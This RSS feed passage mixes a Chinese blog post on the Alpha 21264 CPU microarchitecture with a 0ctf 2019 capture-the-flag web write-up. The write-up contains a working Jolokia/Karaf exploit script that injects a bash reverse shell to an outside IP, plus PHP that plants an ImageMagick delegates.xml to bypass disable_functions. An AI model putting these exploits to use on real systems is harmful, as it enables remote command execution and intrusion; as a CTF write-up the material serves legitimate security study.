&lt;p&gt;Alpha 21264处理器的I-Cache是64Kb，2路组相连。处理器实现了路预测算法，结合了组相联的缓存效率与直接映射缓存的访问速度。取指部件的结构图如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/ins-fetch.png&#34; alt=&#34;Instruction Fetch&#34; /&gt;&lt;/p&gt;

&lt;p&gt;每次取四条指令之后，都会生成一个line和way的预测。该预测指向接下来四条指令的取指位置，包括line和way两个位置信息。处理器在根据预测读取接下来四条指令的同时，会并行地对正在执行的的四条指令的正确性进行检查。&lt;/p&gt;

&lt;p&gt;在I-Cache被填充时，以及预测出错时，预测器会被重新训练。在绝大部分的应用程序中，预测器对于line的预测正确率达到了85%，对way的预测准确率达到了100%。为了避免过度训练，预测器设置了2 bit的滞后计数器。当且仅当目前预测器多次发生错误的时候才会进行重新训练。由于预测的高准确率以及很低的miss panalty，该预测机制能够大大提升处理器速度。不仅如此，对于一些可预测的跳转（如动态链接库的调用），可以被很好地训练，减少了计算转移地址的开销（约8个周期）。&lt;/p&gt;

&lt;p&gt;当I-Cache发生缓存不命中时，I-Cache会向L2缓存预取最多64字节的数据（即16条指令）。这种预取模式很大地提高了取指的带宽。&lt;/p&gt;

&lt;h3 id=&#34;转移预测&#34;&gt;转移预测&lt;/h3&gt;

&lt;p&gt;相比于前代的处理器，转移预测模块对于Alpha 21264的影响更大，原因如下：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Alpha 21264的panelty是7个周期，比前代稍高。&lt;/li&gt;
&lt;li&gt;Alpha 21264处理器的指令执行速度大大提升。&lt;/li&gt;
&lt;li&gt;成功的转移预测能够更好地配合推测执行机制。21164处理器可以容纳20条推测执行的指令，而21264可以容纳多达80条指令。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Alpha 21264的转移预测系统从局部预测和全局预测中动态选择。再绝大多数benchmark中可以得到90%到100%的准确率。21264的预测器结构如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/21264-predictor.png&#34; alt=&#34;Branch Predictor&#34; /&gt;&lt;/p&gt;

&lt;p&gt;该图左侧是10-bit局部转移pattern，并包含3-bit计数器。局部预测器根据这10-bit从1024个转移计数器中选取一个。图右侧是12-bit的全局转移预测器，对应着全局信息表中的4096个条目之一。同时处理器还有一个Choice Predictor来决定选择哪个预测器的结果。这个predictor根据12-bit的全局记录对4096个条目进行索引。&lt;/p&gt;

&lt;p&gt;当一个转移指令被最终提交之后，局部预测器被更新。当一个转移指令发射时，全局计数器就会提前被更新。当然，全局计数器会保存该计数器的备份来防止转移预测失败。&lt;/p&gt;

&lt;h2 id=&#34;乱序执行-out-of-order-execution&#34;&gt;乱序执行 (Out-Of-Order Execution)&lt;/h2&gt;

&lt;p&gt;Alpha 21264的乱序执行机制允许每个周期发射四条指令。OOO部件会对寄存器进行重命名及映射以解决不必要的寄存器依赖。指令将会被放在队列中，等待其需要的部件的空闲。Alpha 21264有两个定点运算部件以及两个浮点运算部件，所以每个周期处理器最多同时指令6条指令。&lt;/p&gt;

&lt;p&gt;下图是乱序执行部件的结构图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/rename-map.png&#34; alt=&#34;Renaming map and queue&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;寄存器重命名&#34;&gt;寄存器重命名&lt;/h3&gt;

&lt;p&gt;寄存器重命名为每条指令分配程序员不可见的结果寄存器。这种技术有以下优点：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;较好地支持推测执行&lt;/li&gt;
&lt;li&gt;在解决了write-after-read和write-after-write冲突的同时保留了read-after-write的依赖&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;上图的左侧更详细地展示了重命名部件。不难发现，寄存器重命名是在Content-Addressable Memory(CAM)上完成的。流水线中所涉及到的所有操作都发生在重命名后的寄存器中，而不是用户可见的寄存器。&lt;/p&gt;

&lt;p&gt;除了用户可见的31个定点寄存器和31个浮点寄存器，Alpha 21264还有用户不可见的41个定点寄存器和41个浮点寄存器。乱序执行、推测执行的结果均存放在这些不可见的寄存器中，不影响用户可见的寄存器的状态。&lt;/p&gt;

&lt;p&gt;条件传送指令（conditional-move instruction）在重命名阶段需要被特殊处理。这条指令选择性地将两个寄存器中的一个移动到第三个寄存器中。这是Alpha处理器中唯一需要三个源寄存器的指令：两个寄存器存放待传送的值，一个寄存器保留目标寄存器的原值（以应对传送不发生的情况）。Alpha 21264会将每个条件传送指令分解为两个指令。这两个指令只有两个源寄存器。第一条指令将两个存放待传送的值的寄存器之一放入一个内部寄存器，该内部寄存器的第65位用来标记传送是否成功。第二条指令根据标志位将内部寄存器和目标寄存器的原值选择一个存入目标寄存器。&lt;/p&gt;

&lt;h3 id=&#34;乱序执行队列-out-of-order-issues-queue&#34;&gt;乱序执行队列（Out-of-Order issues queue）&lt;/h3&gt;

&lt;p&gt;执行队列由定点执行队列与浮点执行队列两个独立的队列组成。通过记分板技术，处理器每个周期将从队列中选择运算部件可用的指令。记分板将记录单周期、多周期以及不定周期（方寸）指令。一旦这些指令retire，记分板会向所有需要该指令结果的指令进行广播。定点执行队列有20个位置，浮点执行队列有15个位置。队列的结构如上图的右侧。&lt;/p&gt;

&lt;p&gt;定点队列静态地将每条指令分配给两个仲裁器中的一个。每个仲裁者负责四个定点执行流水线中的两个。在一个周期中，每个仲裁者将issue队列中最老的两条指令。这部分具体的细节在Execution Engine一章中有更为详细的介绍。&lt;/p&gt;

&lt;p&gt;在定点和浮点执行队列中，老的指令的优先级高于新的指令。这保证了推测执行不会影响到正常执行的指令的速度。&lt;/p&gt;

&lt;h3 id=&#34;指令retire与中断处理&#34;&gt;指令retire与中断处理&lt;/h3&gt;

&lt;p&gt;虽然指令被乱序执行，但是所有指令都是被按序retire的。按序retire保证了精确中断。当一个指令执行完毕后，当且仅当这条指令之前的所有指令都retire以后，这条指令才可以retire。按序retire要求处理器记录内部寄存器的使用。每条指令都会额外记录其目的寄存器的原值。当这条指令retire后，原值不可能再被用到，故即可丢掉。如果需要回滚指令，则可以使用保存的原值进行指令回滚。Retire部件有一个80个entry的窗口，提供了极高的并发度。下图展示了不同类型指令从issue到retire的最小需要的周期数：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/retire-pipe-stage.png&#34; alt=&#34;retire pipe stage&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在较短的时间窗口内，retire机制在一个周期最多可以提交11条指令，并且可保持在每个周期retire 8条指令。&lt;/p&gt;

&lt;h2 id=&#34;执行引擎-execution-engine&#34;&gt;执行引擎 (Execution Engine)&lt;/h2&gt;

&lt;p&gt;下图为执行引擎的结构：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/execution-pipes.png&#34; alt=&#34;execution pipes&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从图中我们可以看到，整个处理器有六个执行的流水线，其由两个浮点运算流水线与四个定点运算流水线组成。这些流水线在物理上被放置在相应的寄存器堆的上方或者下方。Alpha 21264处理器将定点的计算流水线划分为两个集群(cluster)，每个集群都会保存一整份寄存器堆。虽然定点寄存器集群需要额外的一个周期来广播寄存器的变化，这种设计大大简化了处理器的设计，并提升了处理器的性能。&lt;/p&gt;

&lt;p&gt;事实上，集群的结构带来的性能开销很小，原因如下：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;很多操作(如Load与Store)只能在集群的上部或者下部进行运算，其不会对寄存器堆产生影响&lt;/li&gt;
&lt;li&gt;关键路径(critical path)上的指令倾向于在同一个集群上执行&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;由于老的指令critical程度高于新的指令，所以critical程度越高的指令，在集群中会更早地被执行。这使得集群之间对数据的等待过程减少。&lt;/p&gt;

&lt;p&gt;上图中同样描述了浮点流水线，该流水线有一个72个entry的寄存器堆。&lt;/p&gt;

&lt;p&gt;Alpha 21264有如下新的计算部件：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Alpha motion-video instruction(MVI): 加速图像处理&lt;/li&gt;
&lt;li&gt;一个完全整合在流水线中的定点乘法单元&lt;/li&gt;
&lt;li&gt;Integer population count and leading/trailing zero count unit&lt;/li&gt;
&lt;li&gt;浮点开平方运算单元&lt;/li&gt;
&lt;li&gt;在定点寄存器与浮点寄存器之间传送数据的部件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下图展示了Alpha 21264中的指令延迟：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/ins-latencies.png&#34; alt=&#34;Instruction latencies&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;内部存储系统-internal-memory-system&#34;&gt;内部存储系统 (Internal Memory System)&lt;/h2&gt;

&lt;p&gt;Alpha 21264的内部存储系统支持尚未完成的访存、推测执行。访存处理每个周期最多处理来自定点运算部件的两个访存请求。Alpha 21264的访存部件最多可以追踪32个未完成的Load、32个未完成的Store和8个未完成的缓存失效。该存储系统有一个64Kb的二路组相联高速缓存，其不命中率远低于8Kb高速缓存。该访存系统具有高带宽、低延迟的特点。&lt;/p&gt;

&lt;h3 id=&#34;数据通路-data-path&#34;&gt;数据通路 (data path)&lt;/h3&gt;

&lt;p&gt;Alpha 21264每周期支持两个不冲突的访存操作。为支持这一点，Alpha 21264的cache每周期支持两次访问（在时钟的上升沿和下降沿各一次）。所以Ahpha 21264的D-Cache访问频率是时钟频率的两倍，这是21264存储系统的重要特点。下图是21264存储系统的数据通路：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/memory-data-path.png&#34; alt=&#34;21264 internal memory data path&#34; /&gt;&lt;/p&gt;

&lt;p&gt;两条64位的数据线路是内部存储系统的核心。每次load操作都会通过这两条数据线路从D-Cache、推测执行数据缓冲区(speculative store data buffer)或者外部系统数据中得到数据。Store指令则是先将数据存入推测执行数据缓冲区，当指令retire之后，数据才会被写入到D-Cache或者其它地方。每此对cache的写可以将两条写操作合并为一条写128位的数据。&lt;/p&gt;

&lt;p&gt;Read-modify-write是处理器的一种原子操作。该操作通过在时钟的两个沿先读后写实现。同时，其使用SECDED ECC进行1-bit纠错。&lt;/p&gt;

&lt;p&gt;写操作的数据可以被前递给后续的读取操作。如果某个读指令的地址和处于pending状态的写指令地址一直，则进行数据前递。&lt;/p&gt;

&lt;p&gt;在上图中，当外部数据被加载进来时，写入寄存器堆(pending load)与写入cache堆操作是并行完成的，同样在时钟周期堆两个沿分别操作。D-Cache使用写返回。&lt;/p&gt;

&lt;h3 id=&#34;地址与控制结构-address-and-control-structure&#34;&gt;地址与控制结构 (Address and control structure)&lt;/h3&gt;

&lt;p&gt;内部存储系统存在一个32-entry的LDQ(load queue)和一个32-entry的STQ(store queue)。两个队列中操作的排列顺序和取指顺序一致。&lt;/p&gt;

&lt;p&gt;当一个新的访存指令被issue时，其检查该指令的操作地址和时间。&lt;a href=&#34;https://patents.google.com/patent/US6122706&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Dual-ported address CAM&lt;/a&gt;解决了read-after-read，write-after-write，read-after-write和write-after-read四种hazard。STQ CAM逻辑实现了数据前递功能。&lt;/p&gt;

&lt;p&gt;下图是21264存储系统规划的示例：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/mem-pipeline.png&#34; alt=&#34;memory pipeline&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这张图没看懂，看懂了再补……&lt;/p&gt;

&lt;h3 id=&#34;预取与缓存管理-cache-prefetching-and-management&#34;&gt;预取与缓存管理 (Cache prefetching and management)&lt;/h3&gt;

&lt;p&gt;Alpha 21264设计了一套缓存预取指令，使得程序员可以充分利用缓存系统的高带宽。对于循环或者长数组的操作，这样的指令对程序加速很有帮助。下图是缓存预取与缓存管理的指令：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/cache-management.png&#34; alt=&#34;Cache prefetching and management&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;总线接口-buf-interface-unit&#34;&gt;总线接口 (Buf Interface Unit)&lt;/h2&gt;

&lt;p&gt;总线接口（BIU）连接了内部存储系统，L2缓存和其它部分系统。从上层发送的MAF(miss address file)请求经过BIU在从L2（命中）或者从system chipset（不命中）得到请求。BIU在L2缓存和system chipset中借助8-entry当victim file来传递数据。&lt;/p&gt;

&lt;p&gt;下图展示了21264的外部线路：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/Alpha-21264/external-interface.png&#34; alt=&#34;external-interface&#34; /&gt;&lt;/p&gt;

&lt;p&gt;芯片到L2的数据通路和芯片到system的数据通路时分离的。所有的通路都是高速的点对点通信。Alpha 21264使用clock-forwarding技术去最大化带宽利用。&lt;/p&gt;

&lt;p&gt;L2缓存提供了对primary cache对备份。这个缓存是直接映射高速缓存，被数据和指令共享，大小从1M到16M。BIU可支持对SRAM对不同大小、速度的访问。L2缓存的最高传输速度是每1.5CPU周期16Byte，在400MHz的频率下为6.4Gb/s。访问L2缓存的最小延迟是12个周期，比访问D-Cache多9个周期。&lt;/p&gt;

&lt;p&gt;Alpha 21264将address-in和address-out分离。这种设计为地址请求(address requests)和系统探针(system probes)提供了小规模多处理器系统设计的可能。21264的系统接口有管脚数量少，管脚带宽高的特点，使得小规模的多核系统设计变得比较简单。BIU有一个8-entry的系统探针队列，其可以在最短的时间内相应系统探针。&lt;/p&gt;

&lt;p&gt;Alpha 21264提供了一致性操作(coherence actions)。它可以扩展为大规模的计算系统。21264也支持五种标准的cache状态(MOESI, modified-owned-exlusive-share-invalid)。&lt;/p&gt;

&lt;p&gt;BIU提供了范围很大的总线速度。其最大的带宽为每1.5时钟周期8byte数据，在400-MHz的频率下可达3.2GB/s。数据加载延迟为160ns，其中包括60ns的DRAM访问延迟。8个in-flight的MAF队列和8个in-flight的victim队列提供了并行与调度的可能。在Stream benchmark中，Alpha 21264达到1.3GB/s的访存速度。&lt;/p&gt;

&lt;h2 id=&#34;后记&#34;&gt;后记&lt;/h2&gt;

&lt;p&gt;牛逼&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>0ctf 2019 Quals Web writeup</title>
      <link>https://n0b0dycn.me/2019/03/0ctf-2019-quals-web-writeup/</link>
      <pubDate>Tue, 26 Mar 2019 16:04:55 +0800</pubDate>
      
      <guid>https://n0b0dycn.me/2019/03/0ctf-2019-quals-web-writeup/</guid>
      <description>

&lt;p&gt;本次比赛两个web题都是&lt;a href=&#34;https://ricterz.me/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;RicterZ&lt;/a&gt;大佬出的，膜一波Orz&lt;/p&gt;

&lt;h2 id=&#34;ghost-pepper&#34;&gt;Ghost Pepper&lt;/h2&gt;

&lt;p&gt;本题首先通过观察401的响应包找到HTTP Basic认证的用户名karaf：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/401.png&#34; alt=&#34;401.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然后用密码karaf即可绕过认证。接下来通过目录爆破找到目录&lt;code&gt;http://karaf:karaf@192.168.2.88:31337/jolokia/&lt;/code&gt;。到这里我们可以发现这是一个裸的jolokia控制台。&lt;/p&gt;

&lt;p&gt;jolokia是一个Java系统管理解决方案。其采用轻量级的Json格式传输数据，可以方便地管理系统中的Servlet。所以当应用暴露了jolokia目录的时候，基本上算是直接暴露出来一个webshell。我们可以通过访问&lt;code&gt;http://karaf:karaf@192.168.2.88:31337/jolokia/list&lt;/code&gt;来查看可用的api，来寻找利用点。在本题中有三种解题方式：&lt;/p&gt;

&lt;h3 id=&#34;解法-1&#34;&gt;解法 1&lt;/h3&gt;

&lt;p&gt;通过karaf下bundle模块远程安装一个我们自己写的恶意bundle，反弹一个shell到自己的服务器上。参考&lt;a href=&#34;https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi&lt;/a&gt;。但是由于我不熟悉Java编译出来的东西始终装不上Orz，等弄好了把整个项目代码扔github上面去= =&lt;/p&gt;

&lt;h3 id=&#34;解法-2&#34;&gt;解法 2&lt;/h3&gt;

&lt;p&gt;第二种方法应该算是最省事的方法了，即通过karaf下feature模块安装一个webconsole：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/webconsole.png&#34; alt=&#34;webconsole&#34; /&gt;&lt;/p&gt;

&lt;p&gt;之后我们访问&lt;code&gt;http://192.168.2.88:31337/system/console/bundles&lt;/code&gt;就可以进入到webconsole的管理界面。在管理界面点Main -&amp;gt; Goto即可进入console。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/goto.png&#34; alt=&#34;goto&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在console中执行&lt;code&gt;cat /flag&lt;/code&gt;即可得到flag：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/console.png&#34; alt=&#34;console&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;解法-3&#34;&gt;解法 3&lt;/h3&gt;

&lt;p&gt;使用karaf中的Instance模块，在安装一个新的instance的时候进行instance的命令行参数注入。我们看karaf源码：&lt;a href=&#34;https://github.com/apache/karaf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/apache/karaf&lt;/a&gt;。在&lt;code&gt;org/apache/karaf/instance/core/InstancesMBean.java&lt;/code&gt;文件中定义了MBean的接口：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Operations
void startInstance(String name) throws MBeanException;
void startInstance(String name, String opts) throws MBeanException;
void startInstance(String name, String opts, boolean wait, boolean debug) throws MBeanException;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们找startInstance方法的实现，在文件&lt;code&gt;org/apache/karaf/instance/command/StartCommand.java&lt;/code&gt;中其调用了Instance的Start方法：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/startCommand.png&#34; alt=&#34;startCommand&#34; /&gt;&lt;/p&gt;

&lt;p&gt;跟进Instance类的start方法，其调用了InstanceService中的startInstance方法：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/instanceImpl.png&#34; alt=&#34;instanceImpl&#34; /&gt;&lt;/p&gt;

&lt;p&gt;继续跟进&lt;code&gt;org/apache/karaf/instance/core/internal/InstanceServiceImpl.java&lt;/code&gt;，其调用了doStart方法：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/startInstance.png&#34; alt=&#34;startInstance&#34; /&gt;&lt;/p&gt;

&lt;p&gt;继续看doStart方法，其中有明显的命令拼接：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/doStart.png&#34; alt=&#34;doStart&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在此处，我们发现javaOpt是我们可控的参数。在&lt;code&gt;InstancesMBeanImpl&lt;/code&gt;中我们发现createInstance参数有一个就是javaOpt：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/mbean.png&#34; alt=&#34;mbean&#34; /&gt;&lt;/p&gt;

&lt;p&gt;于是我们给出攻击思路：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;创建一个新的Instance，在其javaOpt字段进行参数注入&lt;/li&gt;
&lt;li&gt;开启这个新的Instance执行我们的命令&lt;/li&gt;
&lt;li&gt;停止Instance&lt;/li&gt;
&lt;li&gt;删除Instance&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;最后我们给出exp：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
from pprint import pprint

url = &amp;quot;http://111.186.63.207:31337/jolokia/&amp;quot;

create_instance = {
    &amp;quot;type&amp;quot;: &amp;quot;EXEC&amp;quot;,
    &amp;quot;mbean&amp;quot;:&amp;quot;org.apache.karaf:name=root,type=instance&amp;quot;,
    &amp;quot;operation&amp;quot;: &amp;quot;createInstance(java.lang.String,int,int,int,java.lang.String,java.lang.String,java.lang.String,java.lang.String)&amp;quot;,
    &amp;quot;arguments&amp;quot;: [
        &amp;quot;n0b0dy&amp;quot;, # name
        22, # ssh port
        1099, # rmiRegistryPort
        44444, # rmiServerPort
        &amp;quot;/opt/opendaylight-0.9.2/instances/n0b0dy&amp;quot;, # location
        &amp;quot;|| bash -i &amp;gt;&amp;amp; /dev/tcp/149.28.194.202/33333 0&amp;gt;&amp;amp;1 #&amp;quot;, # javaOpts
        None, # features
        None # featureURLs
    ]
}

start_instance = {
    &amp;quot;type&amp;quot;: &amp;quot;EXEC&amp;quot;,
    &amp;quot;mbean&amp;quot;:&amp;quot;org.apache.karaf:name=root,type=instance&amp;quot;,
    &amp;quot;operation&amp;quot;: &amp;quot;startInstance(java.lang.String,java.lang.String)&amp;quot;,
    &amp;quot;arguments&amp;quot;: [
        &amp;quot;n0b0dy&amp;quot;, # name
        &amp;quot;&amp;quot;, # opts
    ]
}


stop_instance = {
    &amp;quot;type&amp;quot;: &amp;quot;EXEC&amp;quot;,
    &amp;quot;mbean&amp;quot;:&amp;quot;org.apache.karaf:name=root,type=instance&amp;quot;,
    &amp;quot;operation&amp;quot;: &amp;quot;stopInstance&amp;quot;,
    &amp;quot;arguments&amp;quot;: [
        &amp;quot;n0b0dy&amp;quot;, # name
    ]
}


destory_instance = {
    &amp;quot;type&amp;quot;: &amp;quot;EXEC&amp;quot;,
    &amp;quot;mbean&amp;quot;:&amp;quot;org.apache.karaf:name=root,type=instance&amp;quot;,
    &amp;quot;operation&amp;quot;: &amp;quot;destroyInstance&amp;quot;,
    &amp;quot;arguments&amp;quot;: [
        &amp;quot;n0b0dy&amp;quot;, # name
    ]
}

headers = {
    &amp;quot;Authorization&amp;quot;: &amp;quot;Basic a2FyYWY6a2FyYWY=&amp;quot;
}

exp = [create_instance, start_instance, stop_instance, destory_instance]
for e in exp:
    rep = requests.post(url, json=e, headers=headers)
    pprint(rep.json())
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;wallbreaker&#34;&gt;Wallbreaker&lt;/h2&gt;

&lt;p&gt;这个题目提出了一种新的用imagick来绕过&lt;code&gt;disable_function&lt;/code&gt;的方法。根据&lt;a href=&#34;https://imagemagick.org/script/resources.php&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;文档&lt;/a&gt;描述，&lt;code&gt;delegate.xml&lt;/code&gt;用于指定转换特定文件用的命令：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Associate delegate programs with certain image formats. ImageMagick relies on a number of delegate programs to support certain image formats such as ufraw-batch to read raw camera formats or Ghostscript to read Postscript images. Use this configuration file to map an input or output format to an external delegate program.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;文档中还给出了一个&lt;a href=&#34;https://imagemagick.org/source/delegates.xml&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;示例&lt;/a&gt;：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;delegatemap xmlns=&amp;quot;&amp;quot;&amp;gt;
&amp;lt;delegate xmlns=&amp;quot;&amp;quot; decode=&amp;quot;bpg&amp;quot; command=&amp;quot;&amp;quot;bpgdec&amp;quot; -b 16 -o &amp;quot;%o.png&amp;quot; &amp;quot;%i&amp;quot;; /usr/bin/mv &amp;quot;%o.png&amp;quot; &amp;quot;%o&amp;quot;&amp;quot;/&amp;gt;
...
&amp;lt;/delegatemap&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们可以看到&lt;code&gt;delegates.xml&lt;/code&gt;中定义了很多命令执行的函数。那么我们可以自己定义&lt;code&gt;delegates.xml&lt;/code&gt;文件吗？答案是可以的要不然这道题就没法做了2333&lt;/p&gt;

&lt;p&gt;Imagick有一些环境变量比较重要，比如&lt;code&gt;HOME&lt;/code&gt;变量。根据文档的描述，这个变量是用来寻找config文件的跟路径：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Set path to search for configuration files in $HOME/.config/ImageMagick if the directory exists.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;而Imagick的配置文件涉及到两个目录，即&lt;code&gt;$HOME/.config/ImageMagick&lt;/code&gt;和&lt;code&gt;$HOME/.magick&lt;/code&gt;。Imagick会在这两个目录下寻找delegates.xml文件，并进行解析。在delegates.xml中，我们可以对某个特定的文件后缀（此处为&lt;code&gt;foo&lt;/code&gt;）指定其解析的方式。根据题目描述，我们将这个命令设置为需要执行的&lt;code&gt;/readflag&lt;/code&gt;：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;delegatemap&amp;gt;&amp;lt;delegate decode=&amp;quot;foo&amp;quot; command=&amp;quot;/readflag &amp;gt; /tmp//flag&amp;quot;/&amp;gt;&amp;lt;/delegatemap&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;思路清晰以后，我们可以来写代码。首先在open_basedir的限制条件中找一个可以写的目录用来放我们的配置文件。题目的环境是tmp下面的一个根据ip生成的文件夹，在我们的环境中我们使用&lt;code&gt;/tmp&lt;/code&gt;作为示例。同时我们打开error的显示便于调试：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$home = &#39;/tmp/&#39;;
ini_set(&#39;display_errors&#39;, 1);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来我们将HOME环境变量设置为&lt;code&gt;tmp&lt;/code&gt;并向&lt;code&gt;$HOME&lt;/code&gt;下面写入我们的&lt;code&gt;delegates.xml&lt;/code&gt;文件：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;putenv(&amp;quot;HOME=$home/&amp;quot;);
mkdir(&amp;quot;$home/.config/&amp;quot;);
mkdir(&amp;quot;$home/.config/ImageMagick&amp;quot;);
file_put_contents(&amp;quot;$home/.config/ImageMagick/delegates.xml&amp;quot;,
    &amp;quot;&amp;lt;delegatemap&amp;gt;&amp;lt;delegate decode=\&amp;quot;foo\&amp;quot; command=\&amp;quot;/readflag &amp;gt; $home/flag\&amp;quot;/&amp;gt;&amp;lt;/delegatemap&amp;gt;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在delegate文件中，我们将&lt;code&gt;/readflag&lt;/code&gt;的执行结果写入到&lt;code&gt;$HOME/flag&lt;/code&gt;文件中，最后我们将结果读出来：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;touch(&amp;quot;$home/test.foo&amp;quot;);
try {
  $i = new Imagick(&amp;quot;$home/test.foo&amp;quot;);
  $i-&amp;gt;writeImage(&amp;quot;$home/test.png&amp;quot;);
} catch(Exception $e) {
  var_dump($e);
}
var_dump(file_get_contents(&amp;quot;$home/flag&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;经过这一波操作我们可以最终得到flag：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/wallbreaker.png&#34; alt=&#34;result&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title></title>
      <link>https://n0b0dycn.me/links/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://n0b0dycn.me/links/</guid>
      <description>

&lt;h1 id=&#34;useful-links&#34;&gt;Useful Links&lt;/h1&gt;

&lt;h2 id=&#34;friends&#34;&gt;Friends&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://atum.li/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Atum&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://ricterz.me/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;ricterz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://zzm.cat/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;zzm&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>